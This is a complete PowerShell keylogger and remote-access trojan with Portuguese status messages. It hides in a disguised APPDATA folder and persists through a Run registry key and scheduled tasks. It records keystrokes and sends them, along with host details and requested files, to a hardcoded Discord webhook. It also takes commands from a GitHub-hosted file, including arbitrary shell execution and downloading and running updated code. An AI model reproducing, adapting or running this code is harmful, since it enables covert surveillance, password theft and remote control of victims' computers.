param([switch]$Test, [switch]$Debug)
if (-not $Debug) { $ErrorActionPreference = "SilentlyContinue" }

# ===================== CONFIG =====================
$hook    = "https://discord.com/api/webhooks/1574502039323545742/FGJ91Pysy7zdQwD64rLOfrSyMa9-c5o-g8_29n5sEqzLr2KS96o9sWrPx5Zp7uY3ukUt"
$repo    = "Capyvests/office-365"
$br      = "main"
# ==================================================

$cmdUrl  = "https://raw.githubusercontent.com/$repo/$br/cmd.txt"
$boot    = "https://raw.githubusercontent.com/$repo/$br/k.ps1"
$shutSrc = "https://raw.githubusercontent.com/$repo/$br/shut.ps1"

$dir  = "$env:APPDATA\Microsoft\WinSvc"
$self = "$dir\k.ps1"
$log  = "$dir\svc.log"
$posF = "$dir\pos.txt"
$run  = "$dir\run.txt"
$shut = "$dir\shut.ps1"
$tr   = "powershell -w hidden -ep bypass -f `"$self`""
$trS  = "powershell -w hidden -ep bypass -f `"$shut`""

New-Item -ItemType Directory $dir -Force | Out-Null
if ($PSCommandPath -and $PSCommandPath -ne $self) { Copy-Item $PSCommandPath $self -Force }
if (-not (Test-Path $self)) { curl.exe -s -o $self $boot }
if (-not (Test-Path $log))  { Set-Content $log "" }
Add-Content $run "start $(Get-Date -f s)"

$pos = 0
if (Test-Path $posF) { $pos = [int](Get-Content $posF) }
$len0 = 0
if (Test-Path $log) { $len0 = (Get-Content $log -Raw).Length }
if (-not $len0) { $len0 = 0 }
if ($pos -gt $len0) { $pos = $len0 }

function Send($t) {
  if (-not $t) { return }
  if ($Debug) { Write-Host "SEND> $t" }
  foreach ($i in 0..([Math]::Ceiling($t.Length / 350) - 1)) {
    $c = $t.Substring($i * 350, [Math]::Min(350, $t.Length - $i * 350))
    $body = '```' + $c + '```'
    for ($r = 1; $r -le 3; $r++) {
      curl.exe -s -f --form-string "content=$body" $hook | Out-Null
      if ($LASTEXITCODE -eq 0) { break }
      Start-Sleep -Seconds 2
    }
  }
}

Send "[i] iniciado em $env:COMPUTERNAME / $env:USERNAME"

if (-not $Test -and -not $Debug) {
  $mtx = New-Object Threading.Mutex($false, "WinSvcMtx")
  if (-not $mtx.WaitOne(0)) { Add-Content $run "mutex ocupado"; Send "[i] ja havia instancia"; exit }

  Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc -Value $tr
  schtasks /create /tn SysSvc   /tr $tr  /sc onlogon      /f 2>$null
  schtasks /create /tn SysSvcW  /tr $tr  /sc minute /mo 5 /f 2>$null
  if (-not (Test-Path $shut)) { curl.exe -s -o $shut $shutSrc }
  schtasks /create /tn SysSvcS1 /tr $trS /sc onevent /ec System /mo "*[System/EventID=6006]" /f 2>$null
  schtasks /create /tn SysSvcS2 /tr $trS /sc onevent /ec System /mo "*[System/EventID=1074]" /f 2>$null
  Send "[i] persistencia criada"
}

function Flush {
  if (-not (Test-Path $log)) { return }
  $a = Get-Content $log -Raw
  if (-not $a) { return }
  if ($pos -gt $a.Length) { $pos = 0 }
  if ($a.Length -le $pos) { return }

  $d = $a.Substring($pos)
  $f = "$env:TEMP\k_$(Get-Date -f HHmmss).txt"
  $d | Set-Content $f -Encoding UTF8
  for ($r = 1; $r -le 3; $r++) {
    curl.exe -s -f -F "content=**keylog** $env:COMPUTERNAME" -F "files[0]=@$f" $hook | Out-Null
    if ($LASTEXITCODE -eq 0) { break }
    Start-Sleep -Seconds 2
  }
  Remove-Item $f -ErrorAction SilentlyContinue

  $pos = $a.Length
  if ($a.Length -gt 200000) {
    $a = $a.Substring($a.Length - 100000)
    Set-Content $log $a -NoNewline
    $pos = $a.Length
  }
  Set-Content $posF $pos
}

function Uninstall {
  Send "[ok] uninstall — a limpar"
  foreach ($t in "SysSvc","SysSvcW","SysSvcS1","SysSvcS2") { schtasks /delete /tn $t /f 2>$null }
  Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc 2>$null
  Start-Process powershell -w hidden -ArgumentList "-ep bypass -c Start-Sleep 4; Remove-Item -Recurse -Force '$dir'"
  exit
}

$cs = 'using System; using System.Runtime.InteropServices; public class K { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v); }'
try { Add-Type -TypeDefinition $cs } catch { Send "[erro] Add-Type :: $($_)" }

if (-not ("K" -as [type])) { Send "[erro] tipo K nao carregou — a sair"; exit }

$map  = @{ 8='[BK]'; 9='[TAB]'; 13="`n"; 32=' '; 46='[DEL]'; 27='[ESC]' }
$prev = New-Object 'bool[]' 256
$logOn = $true
$ultimo = ""
$tUlt   = Get-Date
$tRun   = Get-Date

while ($true) {
  try {
    $c = (Invoke-WebRequest "$cmdUrl`?v=$([DateTime]::UtcNow.Ticks)" -UseBasicParsing -TimeoutSec 8).Content
    if ($c -and $c -ne $ultimo) {
      $ultimo = $c

      $cfg = @{}
      foreach ($l in ($c -split "`n")) {
        $l = $l.Trim()
        if (-not $l) { continue }
        if ($l.StartsWith("#")) { continue }
        $i = $l.IndexOf("=")
        if ($i -lt 1) { continue }
        $k = $l.Substring(0, $i).Trim().ToLower()
        $v = $l.Substring($i + 1).Trim()
        if ($v.StartsWith("$k=")) { $v = $v.Substring($k.Length + 1).Trim() }
        $cfg[$k] = $v
      }
      function Flag($n) { $cfg[$n] -eq "1" }

      if (Flag "info") {
        try { Send "[ok] info`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)`nUptime: $((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime)`nIP: $((Get-NetIPAddress -AddressFamily IPv4 | ? {$_.IPAddress -notlike '127.*'} | Select -First 1).IPAddress)" }
        catch { Send "[falhou] info :: $($_)" }
      }

      if (Flag "dump") { try { Flush; Send "[ok] dump" } catch { Send "[falhou] dump :: $($_)" } }

      if (Flag "ls") {
        try {
          if (-not $cfg["ls_path"]) { throw "ls_path vazio" }
          Send "[ok] ls $($cfg['ls_path'])`n$((Get-ChildItem $cfg['ls_path'] | Select -First 40 Name,Length | Out-String))"
        } catch { Send "[falhou] ls :: $($cfg['ls_path']) :: $($_)" }
      }

      if (Flag "get") {
        try {
          if (-not $cfg["get_path"]) { throw "get_path vazio" }
          if (-not (Test-Path $cfg["get_path"])) { throw "nao existe" }
          $f2 = "$env:TEMP\g.txt"
          Get-Content $cfg["get_path"] -Raw | Set-Content $f2 -Encoding UTF8
          curl.exe -s -f --form-string "content=**ok** get $($cfg['get_path'])" -F "files[0]=@$f2" $hook | Out-Null
          Send "[ok] get $($cfg['get_path'])"
        } catch { Send "[falhou] get :: $($cfg['get_path']) :: $($_)" }
      }

      if (Flag "sh") {
        try {
          if (-not $cfg["sh_cmd"]) { throw "sh_cmd vazio" }
          Send "[ok] sh`n$((Invoke-Expression $cfg['sh_cmd'] 2>&1 | Out-String))"
        } catch { Send "[falhou] sh :: $($cfg['sh_cmd']) :: $($_)" }
      }

      if (Flag "shut") { try { & $shut; Send "[ok] shut" } catch { Send "[falhou] shut :: $($_)" } }

      if (Flag "webhook") {
        try { if (-not $cfg["webhook_url"]) { throw "webhook_url vazio" }; $hook = $cfg["webhook_url"]; Send "[ok] webhook alterado" }
        catch { Send "[falhou] webhook :: $($_)" }
      }

      if (Flag "update") {
        try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $shut $shutSrc; Start-Process powershell -w hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
        catch { Send "[falhou] update :: $($_)" }
      }

      if ($cfg["log"] -eq "1") { $logOn = $true } elseif ($cfg["log"] -eq "0") { $logOn = $false }

      if (Flag "uninstall") { Uninstall }
    }
  } catch { if ($Debug) { Write-Host "FETCH FALHOU: $($_)" } }

  if ($logOn) {
    Start-Sleep -Milliseconds 12
    for ($k = 8; $k -lt 256; $k++) {
      try { $d = ([K]::GetAsyncKeyState($k) -band 0x8000) -ne 0 } catch { $d = $false }
      if ($d -and -not $prev[$k]) {
        $ch = $null
        if ($map.ContainsKey($k)) { $ch = $map[$k] }
        elseif ($k -ge 32 -and $k -le 126) {
          $ch = [char]$k
          if ((([K]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0) -bxor [Console]::CapsLock) {
            if ([char]::IsLetter($ch)) { $ch = [char]::ToUpper($ch) }
          }
        }
        if ($ch) { Add-Content $log $ch -NoNewline; $tUlt = Get-Date; if ($Debug) { Write-Host -NoNewline $ch } }
      }
      $prev[$k] = $d
    }
  } else { Start-Sleep -Milliseconds 800 }

  if (((Get-Date) - $tRun).TotalSeconds -gt 30) { Add-Content $run "alive $(Get-Date -f s)"; $tRun = Get-Date }
  if ($logOn -and ((Get-Date) - $tUlt).TotalSeconds -gt 10) { Flush; $tUlt = Get-Date }
}
